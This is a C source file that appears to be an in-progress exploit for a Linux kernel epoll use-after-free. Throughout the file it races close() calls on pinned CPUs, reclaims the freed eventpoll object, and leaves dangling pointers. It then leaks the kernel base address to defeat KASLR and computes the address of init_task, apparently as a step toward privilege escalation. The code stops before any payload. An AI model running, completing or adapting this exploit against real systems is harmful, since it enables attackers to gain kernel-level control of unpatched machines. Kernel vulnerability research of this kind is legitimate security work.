// gcc -static -o epoll epoll.c -lpthread
#define _GNU_SOURCE

#include <err.h>
#include <pthread.h>
#include <sched.h>
#include <stdio.h>
#include <sys/epoll.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <stdint.h>
#include <xdk/core.h>
#include <xdk/postrip.h>

#define SLAB_CPU_PARTIAL_192    12
#define SLAB_OBJ_PER_SLAB_192   21
#define SLAB_CPU_PARTIAL_256    7
#define SLAB_OBJ_PER_SLAB_256   16

/* Glue macros so an object size selects its constants, e.g.
 * SLAB_CPU_PARTIAL(192) -> SLAB_CPU_PARTIAL_192. The two-level indirection lets
 * FILE_SIZE (a macro) be passed as the argument and expand before the ## paste. */
#define _SLAB_CPU_PARTIAL(sz)   SLAB_CPU_PARTIAL_##sz
#define _SLAB_OBJ_PER_SLAB(sz)  SLAB_OBJ_PER_SLAB_##sz

#define SLAB_CPU_PARTIAL(sz)    _SLAB_CPU_PARTIAL(sz)
#define SLAB_OBJ_PER_SLAB(sz)   _SLAB_OBJ_PER_SLAB(sz)

/* Objects that pre-fill the per-CPU partial list up to cpu_partial. */
#define SLAB_NUM_POP_CPU_OBJS(sz)   (SLAB_CPU_PARTIAL(sz) * SLAB_OBJ_PER_SLAB(sz))
/* Objects enclosing the victim, to fill two full slabs. */
#define SLAB_NUM_ENCLOSING_OBJS(sz) (2 * SLAB_OBJ_PER_SLAB(sz))
#define PAGE_SIZE 0x1000

#define SYSCHK(x)                                      \
  ({                                                   \
    typeof(x) __res = (x);                             \
    if (__res == (typeof(x))-1)                        \
      err(1, "SYSCHK(" #x ")");                        \
    __res;                                             \
  })

#define print_and_wait(...)                            \
  do {                                                 \
    printf(__VA_ARGS__);                               \
    getchar();                                         \
  } while (0)

int ep_race_waiter, ep_race_target;
int ep_uaf_waiter, ep_uaf_target;

uint64_t kernel_base;

static void pin_to_cpu(int cpu)
{
  cpu_set_t cset;

  CPU_ZERO(&cset);
  CPU_SET(cpu, &cset);

  SYSCHK(sched_setaffinity(0, sizeof(cset), &cset));
}

static void *close_target(void *arg)
{
  pin_to_cpu(0);
  SYSCHK(close(ep_race_target));

  return NULL;
}

static void *close_waiter(void *arg)
{
  pin_to_cpu(1);

  SYSCHK(prctl(PR_SET_NAME, "slowme", 0, 0, 0));
  SYSCHK(close(ep_race_waiter));

  return NULL;
}

int main(void) {
  struct epoll_event ev = {.events = EPOLLIN};
  pthread_t t1, t2;

  pin_to_cpu(0);
  /*
   * waiter는 race 전에 미리 만들어야 한다.
   * race target의 freed eventpoll을 가져가면 안 된다.
   */
  ep_uaf_waiter = SYSCHK(epoll_create1(0));

  ep_race_waiter = SYSCHK(epoll_create1(0));
  ep_race_target = SYSCHK(epoll_create1(0));

  SYSCHK(epoll_ctl(ep_race_waiter,
                   EPOLL_CTL_ADD,
                   ep_race_target,
                   &ev));

  print_and_wait("before\n");

  /* 먼저 f_ep = NULL 후 mdelay에 들어가게 한다. */
  pthread_create(&t2, NULL, close_waiter, NULL);
  usleep(100000);

  /* race target을 해제한다. */
  pthread_create(&t1, NULL, close_target, NULL);
  pthread_join(t1, NULL);

  pin_to_cpu(0);

  /*
   * free 이후 첫 eventpoll 할당이므로
   * ep_race_target의 자리를 reclaim한다.
   */
  ep_uaf_target = SYSCHK(epoll_create1(0));

  SYSCHK(epoll_ctl(ep_uaf_waiter,
                   EPOLL_CTL_ADD,
                   ep_uaf_target,
                   &ev));

  /*
   * old epi의 hlist_del_rcu()가 실행되어
   * ep_uaf_target->refs.first를 0으로 쓸 때까지 대기.
   */
  pthread_join(t2, NULL);

  print_and_wait("refs.first should be NULL\n");

  /*
   * refs.first가 0이면 새 epi를 찾지 못하고
   * ep_uaf_target의 file/eventpoll만 해제한다.
   */
  SYSCHK(close(ep_uaf_target));

  printf("dangling waiter fd: %d\n",ep_uaf_waiter);

  print_and_wait("two dangling pointers\n");
  
  int window_size = 37;
  
  // kaslr leak
  kernel_base = check_kaslr_base(leak_kaslr_base(window_size));
  
  printf("kernel base : 0x%llx\n",kernel_base);

  uint64_t init_task = kernel_base + 0x0340d8c0;

  printf("init task : 0x%llx",init_task);

  int fd[2];
  pipe(fd);

  print_and_wait("end of main\n");

  return 0;
}